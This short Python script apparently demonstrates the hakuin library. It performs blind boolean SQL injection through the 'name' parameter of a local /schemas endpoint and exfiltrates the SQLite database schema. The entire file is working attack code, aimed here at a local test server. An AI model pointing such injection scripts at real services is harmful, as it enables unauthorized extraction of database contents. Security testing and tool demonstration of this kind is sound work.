import json
import requests

from hakuin.dbms import SQLite
from hakuin import Exfiltrator, Requester



class SimpleRequester(Requester):
    def request(self, ctx, query):
        r = requests.get(f'http://127.0.0.1:8000/schemas?name=({query})')
        assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'
        return r.status_code == 200


requester = SimpleRequester()
dbms = SQLite()
exf = Exfiltrator(requester, dbms)

res = json.dumps(exf.exfiltrate_schema(mode='model_search'), indent=4)
print(res)
